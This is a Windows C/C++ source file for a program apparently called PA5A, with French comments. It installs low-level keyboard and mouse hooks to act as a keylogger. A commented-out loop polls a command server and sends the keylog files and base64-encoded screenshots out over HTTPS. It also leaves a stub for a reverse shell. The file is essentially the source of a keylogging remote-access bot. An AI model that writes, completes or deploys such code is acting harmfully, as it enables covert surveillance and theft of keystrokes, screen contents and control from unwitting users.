#include "pa5a.hpp"

EXTERN_C_START
//#pragma warning(disable : 4996)


DWORD ThreadKeylogger(VOID)
{
    //Hooks sur le clavier et la souris pour le keylogger
    if (!SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0) || !SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))
        ExitThread(EXIT_FAILURE);

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ExitThread(0);
}
/********************************************************************************************************************************************************/
VOID CreateConsole()
{
    AllocConsole();
    FILE* file = NULL;

    freopen_s(&file, "CONIN$", "r", stdin);
    freopen_s(&file, "CONOUT$", "w", stdout);
    freopen_s(&file, "CONOUT$", "w", stderr);
}
/********************************************************************************************************************************************************/
INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow) 
{
    CreateConsole();

    //Thread de polling
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadKeylogger, NULL, 0, NULL);

    while (TRUE)
    {

    }
    /*while (TRUE)
    {
        sendClientInformations();

        struct CommandsToExecute commands;
        commands = GetCommands(SERVER_URL_A, 443);
        printf("Polling\n");
        if (commands.keylogs)
        {
            printf("Envoi des logs\n");

            HANDLE findDataHandle;
            WIN32_FIND_DATA findData;
            LARGE_INTEGER sizeDirectory;
            findDataHandle = FindFirstFile(DATA_FOLDER_W L"\\*.json", &findData);

            if (INVALID_HANDLE_VALUE == findDataHandle)
                break;

            do
            {
                LPWSTR bufferPath = NULL;
                DWORD sizeBufferPath = (wcslen(DATA_FOLDER_W) + wcslen(L"\\") + wcslen(findData.cFileName)) * sizeof(WCHAR) + sizeof(WCHAR);
                if ((bufferPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeBufferPath + sizeof(WCHAR))) == NULL)
                {
                    //Error not enough memory for buffer path
                    break;
                }

                StringCbCatW(bufferPath, sizeBufferPath, DATA_FOLDER_W);
                StringCbCatW(bufferPath, sizeBufferPath, L"\\");
                StringCbCatW(bufferPath, sizeBufferPath, findData.cFileName);
                wprintf(L"%ls\n", bufferPath);

                HANDLE fileHandle = CreateFile(bufferPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                printf("%d %d\n", fileHandle, GetLastError());

                // Check for error
                if (fileHandle == INVALID_HANDLE_VALUE)
                {
                    printf("Source file not opened. Error %u", GetLastError());
                    return EXIT_FAILURE;
                }

                DWORD fileSize = 0;
                fileSize = sizeof(findData.nFileSizeHigh) * 8;
                fileSize |= findData.nFileSizeLow;

                LPSTR buffer = NULL;
                buffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize + 1);

                DWORD dwBytesRead = 0;
                if (!ReadFile(fileHandle, buffer, fileSize, &dwBytesRead, NULL))
                {
                    printf("Source file not read from. Error %u", GetLastError());
                }


                CHAR uuid[UUID_SIZE] = { 0 };
                CHAR url[URL_SIZE] = { 0 };

                GetUuid(uuid);

                //Construction de l'url

                StringCbCatA(url, sizeof(url), CLIENT_API_A);
                StringCbCatA(url, sizeof(url), (LPCSTR)uuid);
                StringCbCatA(url, sizeof(url), KEYLOGS_API_A);

                SendJsonDataByHttps(SERVER_URL_A, HTTPS_PORT, url, "POST", "PA5A-Bot", buffer);

                HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, buffer);

                CloseHandle(fileHandle);
                HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, bufferPath);


            } while (FindNextFile(findDataHandle, &findData) != 0);



            FindClose(findDataHandle);
        }
        if (commands.screenshot)
        {
            if (SaveScreenshot(L"C:\\Users\\Daniel\\Desktop\\screenshot.jpeg") == FALSE)
                return FALSE;

            HANDLE fileHandle = CreateFile(L"C:\\Users\\Daniel\\Desktop\\screenshot.jpeg", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

            LARGE_INTEGER fileSize = { 0 };
            GetFileSizeEx(fileHandle, &fileSize);

            LPBYTE buffer = NULL;
            buffer = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize.QuadPart + 1);

            DWORD dwBytesRead = 0;
            if (!ReadFile(fileHandle, buffer, fileSize.QuadPart, &dwBytesRead, NULL))
            {
                printf("Source file not read from. Error %u", GetLastError());
            }

            DWORD nDestinationSize;
            if (CryptBinaryToStringA((LPCBYTE)buffer, fileSize.QuadPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &nDestinationSize))
            {

                LPSTR pszDestination = (LPSTR)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nDestinationSize * sizeof(CHAR) + 10000));
                if (pszDestination)
                {
                    if (CryptBinaryToStringA((LPCBYTE)buffer, fileSize.QuadPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, pszDestination, &nDestinationSize))
                    {

                        cJSON* object = NULL;
                        LPSTR jsonString = NULL;

                        object = cJSON_CreateObject();

                        cJSON_AddStringToObject(object, "screenshot", pszDestination);

                        jsonString = cJSON_Print(object);
                        printf("%s\n", jsonString);

                        CHAR uuid[UUID_SIZE] = { 0 };
                        CHAR url[URL_SIZE] = { 0 };

                        GetUuid(uuid);

                        StringCbCatA(url, sizeof(url), CLIENT_API_A);
                        StringCbCatA(url, sizeof(url), (LPCSTR)uuid);
                        StringCbCatA(url, sizeof(url), SCREENSHOT_API_A);

                        printf("%s\n", url);

                        SendJsonDataByHttps(SERVER_URL_A, HTTPS_PORT, url, "POST", "PA5A-Bot", jsonString);


                        // Succeeded: 'pszDestination' is 'pszSource' encoded to base64.
                    }
                    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pszDestination);
                }
            }







            _wremove(L"C:\\Users\\Daniel\\Desktop\\screenshot.jpeg");
            //printf("Screenshot envoyé\n");
            printf("Envoi d'un screenshot\n");
        }
        if (commands.reverse_shell)
        {
            //Programme de Samuel
        }
        Sleep(10000);
    }*/


    return 0;
}
/********************************************************************************************************************************************************/

EXTERN_C_END

